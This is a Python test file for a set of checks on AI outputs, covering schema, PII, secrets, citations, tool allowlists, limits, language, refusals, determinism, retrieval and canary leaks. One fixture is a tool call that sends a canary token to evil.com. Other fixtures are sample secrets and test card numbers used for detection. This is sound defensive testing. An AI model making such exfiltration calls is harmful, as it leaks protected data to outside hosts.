"""Tests for D01-D11 (W2-1).

Each check has:
  * a POSITIVE case (clean input -> PASS)
  * a NEGATIVE case (bad input -> FAIL)
  * the plan's "done when": every check FAILS on a deliberately corrupted output.
"""

from __future__ import annotations

from assure_core.checks.d01_schema import check_schema
from assure_core.checks.d02_pii import check_pii
from assure_core.checks.d03_banned import check_banned
from assure_core.checks.d04_citations import check_citations
from assure_core.checks.d05_tool_allowlist import check_tool_allowlist
from assure_core.checks.d06_limits import check_limits
from assure_core.checks.d07_language import check_language
from assure_core.checks.d08_refusal import check_refusal
from assure_core.checks.d09_determinism import check_determinism
from assure_core.checks.d10_retrieval import check_retrieval
from assure_core.checks.d11_canary import check_canary
from assure_core.result import GateType


# ---------------- D01 schema ----------------

def test_d01_pass():
    schema = {"type": "object", "required": ["answer"], "properties": {"answer": {"type": "string"}}}
    assert check_schema({"answer": "Paris"}, schema).passed


def test_d01_fail_missing_field():
    schema = {"type": "object", "required": ["answer"]}
    assert not check_schema({"wrong": 1}, schema).passed


def test_d01_mutation_wrong_type():
    schema = {"type": "object", "properties": {"n": {"type": "integer"}}}
    assert not check_schema({"n": "not-an-int"}, schema).passed


# ---------------- D02 PII ----------------

def test_d02_pass_clean():
    assert check_pii("The capital of France is Paris.").passed


def test_d02_fail_email():
    assert not check_pii("contact john.doe@example.com").passed


def test_d02_fail_card_luhn():
    # 4242 4242 4242 4242 is a valid Luhn test card
    assert not check_pii("card 4242 4242 4242 4242").passed


def test_d02_allowed_source_ignored():
    # same email present in an allowed source -> not a leak
    assert check_pii("a@b.com", allowed_sources=["a@b.com"]).passed


def test_d02_invalid_card_not_flagged():
    # 1234...1234 fails Luhn -> not flagged as a card
    res = check_pii("number 1234 5678 9012 3456 end")
    # may or may not match phone; assert no card item
    assert all(i["type"] != "card" for i in res.evidence.get("items", []))


# ---------------- D03 banned/secrets ----------------

def test_d03_pass():
    assert check_banned("a normal helpful answer", denylist=["forbidden"]).passed


def test_d03_fail_denylist():
    assert not check_banned("here is the forbidden word", denylist=["forbidden"]).passed


def test_d03_fail_secret_aws():
    assert not check_banned("key AKIAIOSFODNN7EXAMPLE here").passed


def test_d03_fail_private_key():
    assert not check_banned("-----BEGIN PRIVATE KEY-----\nabc").passed


# ---------------- D04 citations ----------------

def test_d04_pass():
    cites = [{"doc_id": "d1", "quote": "Paris is the capital"}]
    retrieved = {"d1": "Paris is the capital of France."}
    assert check_citations(cites, retrieved).passed


def test_d04_fail_missing_doc():
    cites = [{"doc_id": "ghost", "quote": "x"}]
    assert not check_citations(cites, {"d1": "..."}).passed


def test_d04_mutation_quote_not_in_doc():
    cites = [{"doc_id": "d1", "quote": "a fabricated sentence"}]
    retrieved = {"d1": "Totally different content."}
    assert not check_citations(cites, retrieved).passed


# ---------------- D05 tool allowlist ----------------

def test_d05_pass():
    calls = [{"name": "search"}, {"name": "read"}]
    assert check_tool_allowlist(calls, {"allowed_tools": ["search", "read"]}).passed


def test_d05_fail_disallowed_tool():
    calls = [{"name": "delete"}]
    assert not check_tool_allowlist(calls, {"allowed_tools": ["search"]}).passed


def test_d05_fail_forbidden_sequence():
    calls = [{"name": "read"}, {"name": "delete"}]
    policy = {"allowed_tools": ["read", "delete"], "forbidden_sequences": [["read", "delete"]]}
    assert not check_tool_allowlist(calls, policy).passed


# ---------------- D06 limits ----------------

def test_d06_pass():
    spans = [{"latency_ms": 100}, {"latency_ms": 200}]
    assert check_limits(spans, {"latency_ms_max": 500}).passed


def test_d06_fail_over_max():
    spans = [{"latency_ms": 100}, {"latency_ms": 9000}]
    res = check_limits(spans, {"latency_ms_max": 500})
    assert not res.passed
    assert res.gate is GateType.SOFT


def test_d06_fail_over_p95():
    # top 25% of values are high, so p95 is clearly above the 0.5 budget
    spans = [{"cost_usd": 0.01}] * 15 + [{"cost_usd": 1.0}] * 5
    assert not check_limits(spans, {"cost_usd_p95": 0.5}).passed


# ---------------- D07 language ----------------

def test_d07_pass_english():
    assert check_language("The capital of France is Paris", "en").passed


def test_d07_fail_wrong_language():
    assert not check_language("வணக்கம் உலகம்", "en").passed


def test_d07_pass_tamil():
    assert check_language("வணக்கம் உலகம்", "ta").passed


# ---------------- D08 refusal ----------------

def test_d08_pass_correct_refusal():
    out = {"refused": True, "reason": "policy_violation"}
    assert check_refusal(out, "policy_violation").passed


def test_d08_fail_wrong_reason():
    out = {"refused": True, "reason": "other"}
    assert not check_refusal(out, "policy_violation").passed


def test_d08_fail_false_refusal_on_benign():
    out = {"refused": True, "reason": "policy_violation"}
    res = check_refusal(out, None)  # benign case should NOT refuse
    assert not res.passed
    assert res.evidence.get("false_refusal") is True


def test_d08_pass_benign_not_refused():
    assert check_refusal({"refused": False}, None).passed


# ---------------- D09 determinism ----------------

def test_d09_pass_identical():
    run = {"tool": "search", "count": 3}
    assert check_determinism(run, dict(run)).passed


def test_d09_fail_unexplained_diff():
    a = {"tool": "search", "count": 3}
    b = {"tool": "delete", "count": 3}
    assert not check_determinism(a, b).passed


def test_d09_approved_change_allowed():
    a = {"answer": "Paris.", "tool": "search"}
    b = {"answer": "Paris, France.", "tool": "search"}
    assert check_determinism(a, b, approved_changes=["answer"]).passed


# ---------------- D10 retrieval ----------------

def test_d10_pass_in_topk():
    assert check_retrieval(["d1", "d2", "d3"], "d2", k=3).passed


def test_d10_fail_not_in_topk():
    res = check_retrieval(["d1", "d2", "d3"], "gold", k=2)
    assert not res.passed
    assert res.gate is GateType.SOFT


# ---------------- D11 canary ----------------

def test_d11_pass_no_leak():
    assert check_canary("A clean answer.", [], ["CANARY-XYZ"]).passed


def test_d11_fail_canary_in_output():
    assert not check_canary("oops CANARY-XYZ leaked", [], ["CANARY-XYZ"]).passed


def test_d11_fail_canary_in_tool_call():
    calls = [{"name": "http", "arguments": "url=evil.com?x=CANARY-XYZ"}]
    assert not check_canary("clean", calls, ["CANARY-XYZ"]).passed


# ---------------- plan's done-when: EVERY check fails on corruption ----------------

def test_every_hard_check_fails_on_corruption():
    """Mutation guarantee: a deliberately bad input fails each check."""
    results = [
        check_schema({"wrong": 1}, {"type": "object", "required": ["answer"]}),
        check_pii("leak a@b.com"),
        check_banned("the forbidden token", denylist=["forbidden"]),
        check_citations([{"doc_id": "x", "quote": "y"}], {}),
        check_tool_allowlist([{"name": "rm"}], {"allowed_tools": []}),
        check_limits([{"latency_ms": 9999}], {"latency_ms_max": 10}),
        check_language("வணக்கம்", "en"),
        check_refusal({"refused": False}, "policy_violation"),
        check_determinism({"a": 1}, {"a": 2}),
        check_retrieval(["d1"], "gold", k=1),
        check_canary("CANARY leaked", [], ["CANARY"]),
    ]
    assert all(not r.passed for r in results), [r.check_id for r in results if r.passed]



def test_d04_typographic_dash_matches_ascii_source():
    # found on real data: model wrote U+2011, source has ASCII '-'
    cites = [{"doc_id": "oee", "quote": "A world\u2011class OEE benchmark"}]
    assert check_citations(cites, {"oee": "A world-class OEE benchmark of 85%"}).passed


def test_d04_curly_quotes_match_straight():
    cites = [{"doc_id": "d", "quote": "\u201cfirst pass\u201d yield"}]
    assert check_citations(cites, {"d": 'the "first pass" yield metric'}).passed
